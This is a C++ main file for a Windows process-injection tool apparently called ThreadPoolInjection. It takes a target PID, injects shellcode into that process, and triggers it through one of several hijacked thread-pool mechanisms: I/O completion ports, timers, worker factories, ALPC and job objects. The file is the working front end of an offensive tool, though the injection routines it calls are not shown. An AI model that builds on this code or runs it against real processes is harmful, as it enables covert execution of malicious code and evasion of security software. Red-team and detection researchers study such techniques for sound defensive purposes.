#include "../include/Main.hpp"

int wmain(int argc, wchar_t** argv)
{
    if (argc < 4) {
        std::cout
            << "Useage: \n"
            << "1: [Target Process PID]\n"
            << "2: [Injection Type] - Options: \"/ioport\", \"/timer\", \"/workerfactory\"\n\n"
            << "3: [Subtypes] - Options: \n\t{\"work\", \"startroutine\"}: for /workerfactory\n"
            << "\t{\"wait\", \"jobobject\", \"alpc\", \"direct\", \"tpio\"}: for /ioport\n"
            << "\t{\"tptimer\"}: for /timer\n"
            << "\nEXAMPLE: ThreadPoolInjection.exe 3314 /ioport alpc\n";
        return EXIT_SUCCESS;
    }

    HandleHijackClass handleType;
    const std::wstring pidStr     = argv[1];
    const std::wstring injType    = argv[2];
    const std::wstring injSubtype = argv[3];

    if (injType == L"/ioport") {
        handleType = TpIoPort;
    } else if (injType == L"/timer") {
        handleType = TpTimer;
    } else if (injType == L"/workerfactory") {
        handleType = TpWorkerFactory;
    } else {
        std::wcerr << L"\n{!!} Invalid Command Line Argument Supplied: " << argv[2] << std::endl;
        return EXIT_FAILURE;
    }

    uint32_t thePID = 0;
    try {
        thePID = std::stoul(pidStr);
    } catch (...) {
        std::wcerr << L"\n{!!} Invalid PID Supplied: " << argv[1] << std::endl;
        return EXIT_FAILURE;
    }

    Process targetProcess(thePID, handleType);
    if (!targetProcess.init()) {
        return EXIT_FAILURE;
    }

    if (wcscmp(argv[3], L"startroutine") != 0) {
        if (!targetProcess.injectShellcode()) {
            return EXIT_FAILURE;
        }
    }

    bool succeeded = false;
    if (injSubtype == L"startroutine") {
        succeeded = targetProcess.ProcessWorkerFactoryInject();
    } else if (injSubtype == L"work") {
        succeeded = targetProcess.ProcessWorkInject();
    } else if (injSubtype == L"alpc") {
        succeeded = targetProcess.ProcessAlpcInject();
    } else if (injSubtype == L"direct") {
        succeeded = targetProcess.ProcessTpDirectInject();
    } else if (injSubtype == L"jobobject") {
        succeeded = targetProcess.ProcessJobInject();
    } else if (injSubtype == L"tpio") {
        succeeded = targetProcess.ProcessTpIoInject();
    } else if (injSubtype == L"wait") {
        succeeded = targetProcess.ProcessWaitInject();
    } else if (injSubtype == L"tptimer") {
        succeeded = targetProcess.ProcessTimerInject();
    } else {
        std::wcerr << L"\n{!!} Invalid Injection Subtype Sent: " << argv[3] << std::endl;
        return EXIT_FAILURE;
    }

    if (!succeeded) {
        return EXIT_FAILURE;
    }

    std::cout << "{+} Finished successfully." << std::endl;
    return EXIT_SUCCESS;
}
